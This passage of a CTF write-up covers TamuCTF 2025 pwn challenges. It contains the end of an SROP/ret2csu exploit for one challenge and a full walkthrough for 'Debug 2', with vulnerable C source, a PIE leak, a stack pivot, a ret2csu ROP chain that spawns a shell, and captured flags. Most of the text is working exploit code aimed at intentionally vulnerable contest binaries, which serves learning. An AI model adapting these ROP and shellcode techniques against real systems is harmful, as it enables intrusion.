       0x0000000000401364 <+84>:    pop    r12
       0x0000000000401366 <+86>:    pop    r13
       0x0000000000401368 <+88>:    pop    r14
       0x000000000040136a <+90>:    pop    r15
       0x000000000040136c <+92>:    ret
    '''

    # r15 -> rdx
    # r14 -> rsi
    # r13 -> edi

    pop_6_regs = exe.sym.__libc_csu_init+82
    call_r12_rbx = exe.sym.__libc_csu_init+56

    rop = flat(
        pop_6_regs,
        0,                          # rbx
        1,                          # rbp
        exe.got.mprotect,           # r12
        0x404000,                   # r13
        0x1000,                     # r14
        7,                          # r15
        call_r12_rbx,
        0,

        0,
        1,
        exe.got.read,
        0,
        0x404000,
        0x100,
        call_r12_rbx,
        0,

        0,
        1,
        exe.got.read,
        0,
        0x404000+0x50,
        0x100,
        call_r12_rbx,
        0,

        0,
        0,
        0x404000,
        0,
        0,
        0,
        call_r12_rbx,
    )

    sleep(0.5)
    s(rop)

    sleep(0.5)
    s(p64(0x404000+0x50)) # read to 0x404000
    shellcode = asm(shellcraft.open('./flag.txt'))
    shellcode += asm(shellcraft.read(6, 'rsp', 100))
    shellcode += asm(shellcraft.write(1, 'rsp', 100))

    sleep(0.5)
    s(shellcode)

def srop():

    shellcode = asm('''

        push rsp
        pop rsi

        xor edi, edi
        syscall

        ret

    ''')
    s(shellcode)

    syscall_ret = 0x500004
    pop_rdi = 0x40136b
    pop_rsi_r15 = 0x401369
    bss = 0x404000

    # call mprotect(bss, 0x1000, 7)
    frame = SigreturnFrame()
    frame.rdi = bss
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rax = 0xa
    frame.rip = syscall_ret
    frame.rsp = 0x400598

    payload = flat(

        pop_rdi, 0,
        pop_rsi_r15, bss + 0x10, 0,
        exe.plt.read,
        syscall_ret,
        bytes(frame)
    )

    s(payload)

    shellcode = asm(f'''
        xor eax, eax
        xor edi, edi
        mov esi, {bss+0x10}
        add rdx, 127
        syscall
    ''')

    sleep(0.5)
    # input()
    s(shellcode.ljust(0xf, b'\x00'))

    shellcode = asm(f'mov rsp, {bss+0x190}')
    shellcode += asm(shellcraft.open('./flag.txt'))
    shellcode += asm(shellcraft.read('rax', 'rsp', 100))
    shellcode += asm(shellcraft.write(1, 'rsp', 'rax'))

    sleep(0.5)
    # input()
    s(b'\x90' * 0xf + shellcode)

def exploit():

    # csu()
    srop()

    interactive()

if __name__ == '__main__':
    exploit()
```

### Get flag

```sh
└ ϟ ./xpl.py REMOTE
[*] '/mnt/e/sec/CTFs/2025/TamuCTF/Seven/seven/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to tamuctf.com on port 443: Done
[*] Switching to interactive mode
gigem{my_challenge_names_are_so_creative_right}
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
```

## Debug 2

### Challenge Information

Description: `My friends gave me some advice to fix my code because apparently there were "glaring security flaws". Not sure what they meant, but now my code is more secure than ever!`
Tags:

- Buffer Overflow
- Partial Overwrite
- ret2csu
- Stack Pivot

### Analysis + Exploit

Everything is the same as `Debug 1` but for `Debug 2`, PIE is enabled and besides we don't have the `debug` function anymore

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>

int admin = 0;

int upkeep() {
        // IGNORE THIS
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

int modify(char input[]) {
        puts("Input a string (max length of 69 characters):\n");

        int x = read(0, input, 0x60);

        printf("String you entered: %s\n", input);

        for (int i = 0; i < x; ++i) {
                // Make uppercase letters into lowercase
                if (((int)input[i] >= 97) && ((int)input[i] <= 122)) {
                        input[i] = (char)((int)input[i]-32);
                }
                // Make lowercase letters into uppercase
                else if (((int)input[i] >= 65) && ((int)input[i] <= 90)) {
                        input[i] = (char)((int)input[i]+32);
                }

        }

        return 1;
}

int menu() {
        int sel;
        char input[69];

        while (true) {
                puts("Choose an option:");
                puts("1: Modify string");
                puts("2: Debug Mode");
                puts("3: Exit\n");

                scanf("%d", &sel);
                printf("You selected: %d\n", sel);

                if (sel==1) {
                        modify(input);
                        printf("Your string: %s\n", input);
                        return 1;
                }
                else if (sel==2) {
                        /* This function has been disabled for now :( */
                        // debug();
                        puts("Debug mode has been disabled!");
                        return 1;
                }
                else if (sel==3) {
                        return 1;
                }
                puts("Invalid input! Try again.");
        }
        return 1;
}

// TODO: finish making debug function
// This function has been commented out for security reasons.
/*
int debug() {
        if (admin==0) {
                puts("You are not an administrator!");
                return -1;
        }

        int sel;

        puts("WARNING: If you are reading this and are NOT an");
        puts("administrator, report this to IT immediately!\n");

        while (true) {
                puts("Admin options:");
                puts("1. Print info");
                puts("2. Feature 2 (Uhhhhh idk what to put here)"); // TODO:
                puts("3. Feature 3 (I hope your day is going well :) )"); // TODO:

                scanf("%d", &sel);
                printf("You selected: %d\n", sel);

                if (sel==1) {
                        printf("libc leak: %lx\n", system);

                        puts("Leave a message here (max: 80 characters)!");
                        char message[80];

                        read(0, message, 800);

                        puts("Thanks!");

                        return 1;
                }
                else if (sel==2) {
                        // TODO:
                        return 1;
                }
                else if (sel==3) {
                        // TODO:
                        return 1;
                }
                puts("Invalid input!");
        }
        return 1;
}
*/

int main() {
        upkeep();

        puts("String Modifier v1.4.2");
        puts("Created by: FlamePyromancer"); // :)

        menu();

        printf("\nExiting...\n");
}
```

The idea will still be the same as `Debug 1` but this time we will use Partial Overwrite to return to the main function and combine it with using `printf` to leak PIE

```py
def choice(option: int):
    sl(f'{option}'.encode())

def modify(s: bytes) -> bytes:
    s = bytearray(s)
    n = len(s)

    for i in range(n):
        if s[i] <= 96 or s[i] > 122:
            if 64 < s[i] <= 90:
                s[i] += 32
        else:
            s[i] -= 32

    return bytes(s)


def exploit():

    choice(1)
    s(b'.' * 88 + p8(0xb3))
    ru(b'.' * 88)
    exe_leak = u64(rl()[:-1].ljust(8, b'\0'))
    exe.address = exe_leak - exe.sym.main - 1
    slog('exe leak', exe_leak)
    slog('pie base', exe.address)
```

In this challenge we need to create a `modify` function with will help us save our payload later. So after we have PIE base and return to main again. We'll need to find the way to spawn the shell. Because we just can input `0x60` bytes (this mean we just can overwrite saved RIP), this size isn't enough for normal ROP chain. So in this case we need to use `Stack Pivot`, and to avoid pivot many time (this make me confuse), so I choose the way using `ret2csu`. The input size is enough for our ROP chain if we put it at the beginning of our payload. So use `leave; ret;` gadget to make the RSP point directly to the ROP in the payload

```py
    rop = ROP(exe)
    leave_ret = exe.sym.menu + 212
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    call_r12_rbx = exe.sym.__libc_csu_init + 56         # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12+rbx*8+0x00]
    pop_7_regs = exe.sym.__libc_csu_init + 82           # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret


    '''
    <...>
    0x0000559d20b49438 <+56>:    mov    rdx,r15
    0x0000559d20b4943b <+59>:    mov    rsi,r14
    0x0000559d20b4943e <+62>:    mov    edi,r13d
    0x0000559d20b49441 <+65>:    call   QWORD PTR [r12+rbx*8]
    <...>
    0x0000559d20b49452 <+82>:    pop    rbx
    0x0000559d20b49453 <+83>:    pop    rbp
    0x0000559d20b49454 <+84>:    pop    r12    <--------------- Skip to this
    0x0000559d20b49456 <+86>:    pop    r13
    0x0000559d20b49458 <+88>:    pop    r14
    0x0000559d20b4945a <+90>:    pop    r15
    0x0000559d20b4945c <+92>:    ret
    '''

    rw_section = exe.address + 0x4800
    read_gadget = exe.sym.modify+24
    offset = 80

    choice(1)
    # fake_rbp = exe.bss(0x2f00)
    fake_rbp = exe.bss(0xf80)
    slog('fake rbp', fake_rbp)
    data2 = flat({
        0x50: [
            fake_rbp, exe.sym.menu + 4
        ]
    }, filler=b'.')

    input("1st")
    s(modify(data2))

    choice(1)
    rop1 = [
        pop_rdi,
        exe.got.puts,
        exe.plt.puts,
        # exe.sym.pop_7_regs, 0, 0, # rbx, rbp
        pop_7_regs + 2, # ASSUME rbx = 0
        fake_rbp - 0x50 + 8*9, 0, # r12, r13
        fake_rbp - 0x50 + 8*9, 0x100, # r14, r15
        call_r12_rbx,
        exe.plt.read,
    ]

    data3 = flat({
        0: rop1,

        0x50: [

            fake_rbp - 0x50 - 8,
            leave_ret
        ]

    }, filler=b'.')
    input("2nd")
    s(modify(data3))
```

So when we read into `fake_rbp`, our entire payload will be at `fake_rbp - 0x50`. You will see in the payload above that I have given the saved RBP and saved RIP of the ROP payload as `fake_rbp - 0x50 - 8` and `leave; ret;` respectively. This way, when the `menu` function returns, it will jump straight to our payload. To limit multiple pivots, I took advantage of this condition in `__libc_csu_init`

```c
pwndbg> disass __libc_csu_init
<...>
0x000055c86fd0b445 <+69>:    add    rbx,0x1
0x000055c86fd0b449 <+73>:    cmp    rbp,rbx
0x000055c86fd0b44c <+76>:    jne    0x55c86fd0b438 <__libc_csu_init+56>
<...>
```

I use this one to make it jump back to `__libc_csu_init+56` so that's why you see im `pop_7_regs + 2`. So after get libc base, we can craft a ROP that call `system("/bin/sh")` now. So this time, `__libc_csu_init` shows its full power, we will use it to setup the necessary things to call a function `read@plt`. Now we need to align the registers properly so that after reading it will execute again but the next execution will be to call `system`. To do that I will align the values ​​of `r12 and r14` so that they have the same value, then after reading we will go back and the values ​​of r12 and r14 now have our ROP chain to execute system

```py
    ru(b'Your string: ')
    ru(b'Your string: ')
    ru(b'Your string: ')

    rb(7)
    puts = u64(rb(6).ljust(8, b'\0'))
    libc.address = puts - libc.sym.puts

    slog('puts', puts)
    slog('libc base', libc.address)

    rop2 = ROP(libc)
    rop2.raw(rop2.ret)
    rop2.system(next(libc.search(b'/bin/sh\0')))
    input("3rd")
    s(bytes(rop2))

    interactive()
```

To understand what I'm saying, I highly reccommend debug my payload. If you want to ask you can DM my discord [here](https://discordapp.com/users/590715913939189765)

### Full exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./debug-2_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

# brva 0x11FF
brva 0x12DB
brva 0x11FF
b *menu+213

c
'''.format(**locals())

p = start()
# ==================== EXPLOIT ====================

def choice(option: int):
    sl(f'{option}'.encode())

def modify(s: bytes) -> bytes:
    s = bytearray(s)
    n = len(s)

    for i in range(n):
        if s[i] <= 96 or s[i] > 122:
            if 64 < s[i] <= 90:
                s[i] += 32
        else:
            s[i] -= 32

    return bytes(s)


def exploit():

    choice(1)
    s(b'.' * 88 + p8(0xb3))
    ru(b'.' * 88)
    exe_leak = u64(rl()[:-1].ljust(8, b'\0'))
    exe.address = exe_leak - exe.sym.main - 1
    slog('exe leak', exe_leak)
    slog('pie base', exe.address)

    rop = ROP(exe)
    leave_ret = exe.sym.menu + 212
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    call_r12_rbx = exe.sym.__libc_csu_init + 56         # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12+rbx*8+0x00]
    pop_7_regs = exe.sym.__libc_csu_init + 82           # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret


    '''
    <...>
    0x0000559d20b49438 <+56>:    mov    rdx,r15
    0x0000559d20b4943b <+59>:    mov    rsi,r14
    0x0000559d20b4943e <+62>:    mov    edi,r13d
    0x0000559d20b49441 <+65>:    call   QWORD PTR [r12+rbx*8]
    <...>
    0x0000559d20b49452 <+82>:    pop    rbx
    0x0000559d20b49453 <+83>:    pop    rbp
    0x0000559d20b49454 <+84>:    pop    r12    <--------------- Skip to this
    0x0000559d20b49456 <+86>:    pop    r13
    0x0000559d20b49458 <+88>:    pop    r14
    0x0000559d20b4945a <+90>:    pop    r15
    0x0000559d20b4945c <+92>:    ret
    '''

    rw_section = exe.address + 0x4800
    read_gadget = exe.sym.modify+24
    offset = 80

    choice(1)
    # fake_rbp = exe.bss(0x2f00)
    fake_rbp = exe.bss(0xf80)
    slog('fake rbp', fake_rbp)
    data2 = flat({
        0x50: [
            fake_rbp, exe.sym.menu + 4
        ]
    }, filler=b'.')

    input("1st")
    s(modify(data2))

    choice(1)
    rop1 = [
        pop_rdi,
        exe.got.puts,
        exe.plt.puts,
        # exe.sym.pop_7_regs, 0, 0, # rbx, rbp
        pop_7_regs + 2, # ASSUME rbx = 0
        fake_rbp - 0x50 + 8*9, 0, # r12, r13
        fake_rbp - 0x50 + 8*9, 0x100, # r14, r15
        call_r12_rbx,
        exe.plt.read,
    ]

    data3 = flat({
        0: rop1,

        0x50: [

            fake_rbp - 0x50 - 8,
            leave_ret
        ]

    }, filler=b'.')
    input("2nd")
    s(modify(data3))


    ru(b'Your string: ')
    ru(b'Your string: ')
    ru(b'Your string: ')

    rb(7)
    puts = u64(rb(6).ljust(8, b'\0'))
    libc.address = puts - libc.sym.puts

    slog('puts', puts)
    slog('libc base', libc.address)

    rop2 = ROP(libc)
    rop2.raw(rop2.ret)
    rop2.system(next(libc.search(b'/bin/sh\0')))
    input("3rd")
    s(bytes(rop2))

    interactive()

if __name__ == '__main__':
    exploit()
```

### Get flag

```sh
[*] '/mnt/e/sec/CTFs/2025/TamuCTF/Debug2/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to tamuctf.com on port 443: Done
[+] exe leak: 0x559a0de053b3
[+] pie base: 0x559a0de04000
[*] Loaded 14 cached gadgets for './debug-2_patched'
[+] fake rbp: 0x559a0de08fa0
1st
2nd
[+] puts: 0x7fa11d3c6a40
[+] libc base: 0x7fa11d355000
[*] Loaded 200 cached gadgets for '/mnt/e/sec/CTFs/2025/TamuCTF/Debug2/libc.so.6'
3rd
[*] Switching to interactive mode

$ cat flag*
gigem{f1x3d_d3buG6iN_y3t_st1Ll_f1aWeD_3da42ce3}
```
